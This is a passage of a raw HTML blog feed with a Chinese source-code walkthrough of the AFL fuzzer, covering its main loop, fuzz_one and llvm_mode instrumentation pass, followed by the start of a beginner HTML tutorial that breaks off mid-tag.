in the\n&quot;</span><br>         <span class="hljs-string">&quot;    fuzzer. Poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>);<br><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>         <span class="hljs-string">&quot;Hmm, looks like the target binary terminated before we could complete a\n&quot;</span><br>         <span class="hljs-string">&quot;    handshake with the injected code. There are %s probable explanations:\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;%s&quot;</span><br>         <span class="hljs-string">&quot;    - The current memory limit (%s) is too restrictive, causing an OOM\n&quot;</span><br>         <span class="hljs-string">&quot;      fault in the dynamic linker. This can be fixed with the -m option. A\n&quot;</span><br>         <span class="hljs-string">&quot;      simple way to confirm the diagnosis may be:\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RLIMIT_AS</span><br>         <span class="hljs-string">&quot;      ( ulimit -Sv $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>         <span class="hljs-string">&quot;      ( ulimit -Sd $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^RLIMIT_AS */</span></span><br><br>         <span class="hljs-string">&quot;      Tip: you can use http://jwilk.net/software/recidivm to quickly\n&quot;</span><br>         <span class="hljs-string">&quot;      estimate the required amount of virtual memory for the binary.\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;    - Less likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span><br>         <span class="hljs-string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>,<br>         getenv(DEFER_ENV_VAR) ? <span class="hljs-string">&quot;three&quot;</span> : <span class="hljs-string">&quot;two&quot;</span>,<br>         getenv(DEFER_ENV_VAR) ?<br>         <span class="hljs-string">&quot;    - You are using deferred forkserver, but __AFL_INIT() is never\n&quot;</span><br>         <span class="hljs-string">&quot;      reached before the program terminates.\n\n&quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>         DMS(mem_limit &lt;&lt; <span class="hljs-number">20</span>), mem_limit - <span class="hljs-number">1</span>);<br><br>  &#125;<br><br>  FATAL(<span class="hljs-string">&quot;Fork server handshake failed&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>perform_dry_run函数</strong></p><p>遍历<code>input</code>队列，读取文件内容，调用<code>calibrate_case</code>进行校准，收集错误信息<br><strong>run_target函数</strong><br>执行目标程序，传回状态信息。<br><strong>cull_queue函数</strong><br>通过遍历top_rated[]条目，获取“获胜者”，这些获胜者会获得更多执行时间。优化作用。<br>等等，还要许多配置函数，为环境的顺利做准备。<br><strong>主循环</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><br>    u8 skipped_fuzz;<br><br>    cull_queue();<br><br>    <span class="hljs-keyword">if</span> (!queue_cur) &#123;<span class="hljs-comment">//如果queue当前为空，即执行完一轮</span><br><br>      queue_cycle++;<br>      current_entry     = <span class="hljs-number">0</span>;<br>      cur_skipped_paths = <span class="hljs-number">0</span>;<br>      queue_cur         = <span class="hljs-built_in">queue</span>;<span class="hljs-comment">//准备下一轮</span><br><br>      <span class="hljs-keyword">while</span> (seek_to) &#123;<span class="hljs-comment">//从seek_to指定项开始执行。</span><br>        current_entry++;<br>        seek_to--;<br>        queue_cur = queue_cur-&gt;next;<br>      &#125;<br><br>      show_stats();<br><br>      <span class="hljs-keyword">if</span> (not_on_tty) &#123;<br>        ACTF(<span class="hljs-string">&quot;Entering queue cycle %llu.&quot;</span>, queue_cycle);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>      &#125;<br><br>      <span class="hljs-comment">/* If we had a full queue cycle with no new finds, try</span><br><span class="hljs-comment">         recombination strategies next. */</span><br><br>      <span class="hljs-keyword">if</span> (queued_paths == prev_queued) &#123;<span class="hljs-comment">//如果path数没变，即没有新发现</span><br><br>        <span class="hljs-keyword">if</span> (use_splicing) cycles_wo_finds++; <span class="hljs-keyword">else</span> use_splicing = <span class="hljs-number">1</span>;<span class="hljs-comment">//是否使用splicing策略</span><br><br>      &#125; <span class="hljs-keyword">else</span> cycles_wo_finds = <span class="hljs-number">0</span>;<br><br>      prev_queued = queued_paths;<span class="hljs-comment">//更新路径数</span><br><br>      <span class="hljs-keyword">if</span> (sync_id &amp;&amp; queue_cycle == <span class="hljs-number">1</span> &amp;&amp; getenv(<span class="hljs-string">&quot;AFL_IMPORT_FIRST&quot;</span>))<br>        sync_fuzzers(use_argv);<br><br>    &#125;<br><br>    skipped_fuzz = fuzz_one(use_argv);<span class="hljs-comment">//关键函数fuzz_one</span><br><br>    <span class="hljs-keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;<br>      <br>      <span class="hljs-keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))<br>        sync_fuzzers(use_argv);<br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!stop_soon &amp;&amp; exit_1) stop_soon = <span class="hljs-number">2</span>;<br><br>    <span class="hljs-keyword">if</span> (stop_soon) <span class="hljs-keyword">break</span>;<br><br>    queue_cur = queue_cur-&gt;next;<br>    current_entry++;<br><br>  &#125;<br></code></pre></td></tr></table></figure><p><strong>关键函数fuzz_one()</strong></p><ul><li>先进行优化：概率跳过普通执行项或已执行项，去执行favored</li><li>对于已经fuzz过的或者non-favored的有99%的概率跳过；无pending_favored，95%跳过fuzzed&amp;non-favored，75%跳过not fuzzed&amp;non-favored，不跳过favored；</li><li>打开当前输入文件，读入len长度的buf，关闭文件</li><li>（当之前修理失败时）再次调用<code>celibrate_case</code>，</li><li>修剪：不要重复修剪，哪怕修建失败了</li><li>将读入的buf复制到out_buf</li><li>进行打分，对每个测试用例</li><li>如果我们已经亲自对这里的测试用例进行了fuzzing或早些时候，进行了决定性的测试，跳过这里直接前往<code>havoc_stage</code></li></ul><p><strong>简单位翻转bitflip</strong></p><h2 id="afl-llvm-mode"><a href="#afl-llvm-mode" class="headerlink" title="afl-llvm_mode"></a>afl-llvm_mode</h2><p><strong>关于LLVM</strong></p><ul><li>LLVM 主要为了解决编译时多种多样的前端和后端导致编译环境复杂、苛刻的问题，其核心为设计了一个称为<code> LLVM IR</code> 的中间表示，并以库的形式提供一些列接口，以提供诸如操作 IR 、生成目标平台代码等等后端的功能。</li><li>不同的前端和后端使用统一的中间代码<code>LLVM InterMediate Representation(LLVM IR)</code>，其结果就是如果需要支持一门新的编程语言，只需要实现一个新的前端；如果需要支持一款新的硬件设备，只需要实现一个新的后端；优化阶段为通用阶段，针对统一的 LLVM IR ，与新的编程语言和硬件设备无关。</li><li>GCC 的前后端耦合在一起，没有进行分离，所以GCC为了支持一门新的编程语言或一个新的硬件设备，需要重新开发前端到后端的完整过程。</li><li>Clang 是 LLVM 项目的一个子项目，它是 LLVM 架构下的 C/C++/Objective-C 的编译器，是 LLVM 前端的一部分。相较于GCC，具备编译速度快、占用内存少、模块化设计、诊断信息可读性强、设计清晰简单等优点。</li><li>代码首先由编译器前端clang处理后得到中间代码IR，然后经过各 LLVM Pass 进行优化和转换，最终交给编译器后端生成机器码（<strong>LLVM Pass 是一些中间过程处理 IR 的可以用户自定义的内容，可以用来遍历、修改 IR 以达到插桩、优化、静态分析等目的。</strong>）</li></ul><p><strong>afl-clang-fast</strong><br>1.概述<br>AFL的 llvm_mode 可以实现编译器级别的插桩，可以替代 afl-gcc 或 afl-clang 使用的比较“粗暴”的汇编级别的重写的方法，且具备如下几个优势：</p><ul><li>编译器可以进行优化以提升效率；</li><li>实现与CPU无关，可以在非x86架构上进行fuzz；</li><li>可以更好处理多线程目标程序。</li></ul><p>关于此<code>llvm_mode</code>文件夹：</p><ul><li><code>afl-llvm-rt.o</code>重写了<code>afl-as.h</code>中的main_payload，用于调用；</li><li><code>afl-llvm-pass.so.cc</code>文件主要是当通过 afl-clang-fast 调用 clang 时，这个pass被插入到 LLVM 中，告诉编译器添加与 <code>afl-as.h</code> 中大致等效的代码；</li><li><code>afl-clang-fast.c</code> 文件本质上是 clang 的 wrapper，最终调用的还是 clang 。但是与 afl-gcc 一样，会进行一些参数处理。</li></ul><p><strong><code>llvm_mode</code> 的插桩思路就是通过编写pass来实现信息记录，对每个基本块都插入探针，具体代码在 <code>afl-llvm-pass.so.cc</code> 文件中，初始化和forkserver操作通过链接完成。</strong></p><p><strong>源码分析</strong></p><p><strong>find_pbj</strong><br>寻找运行时的<code>librabies</code>，若失败，abort。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">find_obj</span><span class="hljs-params">(u8* argv0)</span> &#123;<br><br>  u8 *afl_path = getenv(<span class="hljs-string">&quot;AFL_PATH&quot;</span>);<span class="hljs-comment">//寻找AFL_PATH</span><br>  u8 *slash, *tmp;<br><br>  <span class="hljs-keyword">if</span> (afl_path) &#123;<br><br>    tmp = alloc_printf(<span class="hljs-string">&quot;%s/afl-llvm-rt.o&quot;</span>, afl_path);<span class="hljs-comment">//将afl-llvm-rt.o的路径写入tmp</span><br><br>    <span class="hljs-keyword">if</span> (!access(tmp, R_OK)) &#123;<span class="hljs-comment">//如果该路径可以访问，且可读</span><br>      obj_path = afl_path;<span class="hljs-comment">//赋值给obj_path</span><br>      ck_free(tmp);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ck_free(tmp);<br><br>  &#125;<br><br>  slash = <span class="hljs-built_in">strrchr</span>(argv0, <span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-comment">//返回斜杠最后一次出现处的指针</span><br><br>  <span class="hljs-keyword">if</span> (slash) &#123;<span class="hljs-comment">//存在斜杠</span><br><br>    u8 *dir;<br><br>    *slash = <span class="hljs-number">0</span>;<br>    dir = ck_strdup(argv0);<br>    *slash = <span class="hljs-string">&#x27;/&#x27;</span>;<br><br>    tmp = alloc_printf(<span class="hljs-string">&quot;%s/afl-llvm-rt.o&quot;</span>, dir);<br><br>    <span class="hljs-keyword">if</span> (!access(tmp, R_OK)) &#123;<br>      obj_path = dir;<br>      ck_free(tmp);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ck_free(tmp);<br>    ck_free(dir);<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (!access(AFL_PATH <span class="hljs-string">&quot;/afl-llvm-rt.o&quot;</span>, R_OK)) &#123;<br>    obj_path = AFL_PATH;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  FATAL(<span class="hljs-string">&quot;Unable to find &#x27;afl-llvm-rt.o&#x27; or &#x27;afl-llvm-pass.so&#x27;. Please set AFL_PATH&quot;</span>);<br> <br>&#125;<br></code></pre></td></tr></table></figure><ul><li>首先，读取环境变量 AFL_PATH 的值：<ul><li>如果读取成功，确认 <code>AFL_PATH/afl-llvm-rt.o</code> 是否可以访问；如果可以访问，设置该目录为 <code>obj_path</code> ，然后直接返回；</li><li>如果读取失败，检查 <code>arg0</code> 中是否存在<code> /</code> 字符，如果存在，则判断最后一个 <code>/ </code>前面的路径为 AFL 的根目录；然后读取<code>afl-llvm-rt.o</code>文件，成功读取，设置该目录为<code> obj_path</code> ，然后直接返回。</li></ul></li><li>如果上面两种方式都失败，到<code>/usr/local/lib/afl</code> 目录下查找是否存在 <code>afl-llvm-rt.o</code> ，如果存在，则设置为 <code>obj_path</code> 并直接返回（之所以向该路径下寻找，是因为<strong>默认的AFL的MakeFile在编译时，会定义一个名为<code>AFL_PATH</code>的宏，该宏会指向该路径</strong>）；</li></ul><p><strong>总而言之，该函数是为了寻找<code>afl-llvm-rt.o</code>文件，该文件即为要用到的运行时库。</strong></p><p><strong>edit_params函数</strong><br>即编辑对应参数</p><p><strong>2.afl-llvm-pass.so.cc</strong></p><figure class="highlight plaintext"><figcaption><span>文件实现了 LLVM-mode 下的一个插桩 LLVM Pass。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs afl-llvm-pass.so.cc```">该文件只有一个Transform pass：```AFLCoverage```，继承自 ```ModulePass```，实现了一个``` runOnModule``` 函数，这也是我们需要重点分析的函数。<br>```c<br>namespace &#123;<br><br>  class AFLCoverage : public ModulePass &#123;<br><br>    public:<br><br>      static char ID;<br>      AFLCoverage() : ModulePass(ID) &#123; &#125;<br><br>      bool runOnModule(Module &amp;M) override;<br><br>      // StringRef getPassName() const override &#123;<br>      //  return &quot;American Fuzzy Lop Instrumentation&quot;;<br>      // &#125;<br><br>  &#125;;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>runOnModule函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">LLVMContext &amp;C = M.getContext();<br></code></pre></td></tr></table></figure><p>获取上下文；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Decide instrumentation ratio */</span><br><span class="hljs-type">char</span>* inst_ratio_str = getenv(<span class="hljs-string">&quot;AFL_INST_RATIO&quot;</span>);<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> inst_ratio = <span class="hljs-number">100</span>;<br></code></pre></td></tr></table></figure><p>设置插桩密度，默认为100</p><p>获取指向共享内存shm的指针和上一个基本块的id</p><p>开始插桩：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> inst_blocks = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;F : M)<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;BB : F) &#123;<span class="hljs-comment">// 遍历每一个BB（基本块）</span><br><br>      BasicBlock::iterator IP = BB.getFirstInsertionPt();<span class="hljs-comment">//寻找BB中合适位置</span><br>      IRBuilder&lt;&gt; IRB(&amp;(*IP));<span class="hljs-comment">//初始化IRBuider实例执行插入</span><br><br>      <span class="hljs-keyword">if</span> (AFL_R(<span class="hljs-number">100</span>) &gt;= inst_ratio) <span class="hljs-keyword">continue</span>;<span class="hljs-comment">//如果大于插桩密度</span><br><br>      <span class="hljs-comment">/* Make up cur_loc */</span><br><br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cur_loc = AFL_R(MAP_SIZE);<span class="hljs-comment">//随机创建当前基本块ID</span><br><br>      ConstantInt *CurLoc = ConstantInt::get(Int32Ty, cur_loc);<br><br>      <span class="hljs-comment">/* Load prev_loc */</span><br><br>      LoadInst *PrevLoc = IRB.CreateLoad(AFLPrevLoc);<br>      PrevLoc-&gt;setMetadata(M.getMDKindID(<span class="hljs-string">&quot;nosanitize&quot;</span>), MDNode::get(C, None));<br>      Value *PrevLocCasted = IRB.CreateZExt(PrevLoc, IRB.getInt32Ty());<br>      <span class="hljs-comment">//获取上一个BB的ID</span><br><br>      <span class="hljs-comment">/* Load SHM pointer */</span><br><br>      LoadInst *MapPtr = IRB.CreateLoad(AFLMapPtr);<span class="hljs-comment">//获取SHM地址</span><br>      MapPtr-&gt;setMetadata(M.getMDKindID(<span class="hljs-string">&quot;nosanitize&quot;</span>), MDNode::get(C, None));<br>      Value *MapPtrIdx =<br>          IRB.CreateGEP(MapPtr, IRB.CreateXor(PrevLocCasted, CurLoc));<br><br>      <span class="hljs-comment">/* Update bitmap */</span><br>      <span class="hljs-comment">//更新共享内存</span><br>      LoadInst *Counter = IRB.CreateLoad(MapPtrIdx);<br>      Counter-&gt;setMetadata(M.getMDKindID(<span class="hljs-string">&quot;nosanitize&quot;</span>), MDNode::get(C, None));<br>      Value *Incr = IRB.CreateAdd(Counter, ConstantInt::get(Int8Ty, <span class="hljs-number">1</span>));<br>      IRB.CreateStore(Incr, MapPtrIdx)<br>          -&gt;setMetadata(M.getMDKindID(<span class="hljs-string">&quot;nosanitize&quot;</span>), MDNode::get(C, None));<br><br>      <span class="hljs-comment">/* Set prev_loc to cur_loc &gt;&gt; 1 */</span><br><br>      StoreInst *Store =<br>          IRB.CreateStore(ConstantInt::get(Int32Ty, cur_loc &gt;&gt; <span class="hljs-number">1</span>), AFLPrevLoc);<br>      Store-&gt;setMetadata(M.getMDKindID(<span class="hljs-string">&quot;nosanitize&quot;</span>), MDNode::get(C, None));<br><br>      inst_blocks++;<br><br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>3. afl-llvm-rt.o.c</strong><br>该文件主要实现了llvm_mode的3个特殊功能：<code>deferred instrumentation, persistent mode,trace-pc-guard mode</code></p><p><strong>deferred instrumentation</strong>:<br>AFL会尝试通过只执行一次目标二进制文件来提升性能，在<code> main()</code> 之前暂停程序，然后克隆“主”进程获得一个稳定的可进行持续fuzz的目标。简言之，避免目标二进制文件的多次、重复的完整运行，而是采取了一种类似快照的机制。</p><p>虽然这种机制可以减少程序运行在操作系统、链接器和libc级别的消耗，但是在面对大型配置文件的解析时，优势并不明显。</p><p>在这种情况下，可以将 <code>forkserver</code> 的<strong>初始化放在大部分初始化工作完成之后、二进制文件解析之前</strong>来进行，这在某些情况下可以提升10倍以上的性能。我们把这种方式称为LLVM模式下的 <code>deferred instrumentation</code>。</p><p>首先，在代码中寻找可以进行延迟克隆的合适的、不会破坏原二进制文件的位置，然后添加如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL    __AFL_INIT();#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p><strong>persistent mode</strong></p><figure class="highlight plaintext"><figcaption><span>mode``` 并没有通过```fork```子进程的方式来执行fuzz。一些库中提供的API是无状态的，或者可以在处理不同输入文件之间进行重置，恢复到之前的状态。执行此类重置时，可以使用一个长期存活的进程来测试多个用例，以这种方式来减少重复的 ```fork()``` 调用和操作系统的开销。不得不说，这种思路真的很优秀。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs persistent"><br>设计框架如下：<br>设置一个 while 循环，并指定循环次数。在每次循环内，首先读取数据，然后调用想fuzz的库代码，然后重置状态，继续循环。（本质上也是一种快照。）<br><br>对于循环次数的设置，循环次数控制了AFL从头重新启动过程之前的最大迭代次数，较小的循环次数可以降低内存泄漏类故障的影响，官方建议的数值为1000。（循环次数设置过高可能出现较多意料之外的问题，并不建议设置过高。）<br>```c<br>while (__AFL_LOOP(1000)) &#123;  /* Read input data. */  /* Call library code to be fuzzed. */  /* Reset state. */&#125;/* Exit normally */<br></code></pre></td></tr></table></figure><p><strong>trace-pc-guard mode</strong><br>该功能的使用需要设置宏 <code>AFL_TRACE_PC=1 </code>，然后再执行 <code>afl-clang-fast </code>时传入参数<code>-fsanitize-coverage=trace-pc-guard</code>。</p><p>该功能的主要特点是会在每个edge插入桩代码，函数<code>__sanitizer_cov_trace_pc_guard</code>会在每个edge进行调用，该函数利用函数参数 <code>guard </code>指针所指向的 <code>uint32</code> 值来确定共享内存上所对应的地址</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>front</title>
    <link href="/2022/06/30/front/"/>
    <url>/2022/06/30/front/</url>
    
    <content type="html"><![CDATA[<h1 id="前端学习"><a href="#前端学习" class="headerlink" title="前端学习"></a>前端学习</h1><p>跟着黑马程序员学</p><h2 id="0x01-网页与html"><a href="#0x01-网页与html" class="headerlink" title="0x01 网页与html"></a>0x01 网页与html</h2><div class="code-wrapper"><pre><code class="hljs">html是一种**超文本标记语言**网页是一个html文件，由前端人员书写，浏览器渲染而展现</code></pre></div><h3 id="web标准的组成"><a href="#web标准的组成" class="headerlink" title="web标准的组成"></a>web标准的组成</h3><div class="code-wrapper"><pre><code class="hljs">web主要由结构，表现，行为组成结构：html表现：css（设计外观样式）行为：JavaScript（用于交互）</code></pre></div><h3 id="html标签"><a href="#html标签" class="headerlink" title="html标签"></a>html标签</h3><h3 id="html语法规范"><a href="#html语法规范" class="headerlink" title="html语法规范"></a>html语法规范</h3><div class="code-wrapper"><pre><code class="hljs">html标签是用尖括号括起来的关键词有开始标签也有结束标签，结束标签加反斜杠&quot;/&quot;</code></pre></div><p>标签关系<br>包含关系</p><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs (html)">&lt;head&gt;<br>      &lt;title&gt; &lt;/title&gt;<br>&lt;/head&gt;<br></code></pre></td></tr></table></figure><p>并列关系</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;head&gt;</span> <span class="hljs-section">&lt;/head&gt;</span><br><span class="hljs-section">&lt;body&gt;</span> <span class="hljs-section">&lt;/body&gt;</span><br></code></pre></td></tr></table></figure><h3 id="第一个页面"><a href="#第一个页面" class="headerlink" title="第一个页面"></a>第一个页面</h3><p>代码如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>第一个页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    键盘敲烂，工资过万<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>效果如下<br><img src="/2022/06/30/front/p1.png"><br>可见，head标签负责页面上方的部分，如页面的名字<br><img src="/2022/06/30/front/p2.png"><br>而body则是网站主体内容</p><h3 id="Vscode-利用写代码"><a href="#Vscode-利用写代码" class="headerlink" title="Vscode 利用写代码"></a>Vscode 利用写代码</h3><h3 id="DOCTYPE-以及-lang等字符集作用"><a href="#DOCTYPE-以及-lang等字符集作用" class="headerlink" title="!DOCTYPE 以及 lang等字符集作用"></a>!DOCTYPE 以及 lang等字符集作用</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>意思为，使用的是html语言<br><strong>必须写在文件第一行</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;html lang <span class="hljs-operator">=</span> <span class="hljs-string">&quot;en&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>lang语言种类。<br>1.en定义语言为英语<br>2.zh-CN为中文<br>定义是告诉浏览器，语言种类，定义为en也是可以显示中文的。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>UTF-8是万国码，几乎包含全世界所有国家用到的字符。</p><h3 id="html常用标签"><a href="#html常用标签" class="headerlink" title="html常用标签"></a>html常用标签</h3><p>根据标签语义，在合适的地方给一个最合理的标签，可以让页面结构更清晰。</p><h4 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span> - <span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span> 我是一级标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>标签语义：</strong><br>重要的，单列一行的加粗的文字<br>且h1最重要，大于h2，以此类推。一共有六级标题。</p><h4 id="段落和换行标签（重要）"><a href="#段落和换行标签（重要）" class="headerlink" title="段落和换行标签（重要）"></a>段落和换行标签<strong>（重要）</strong></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;p&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我是段落标签<span class="hljs-tag">&lt;/<span 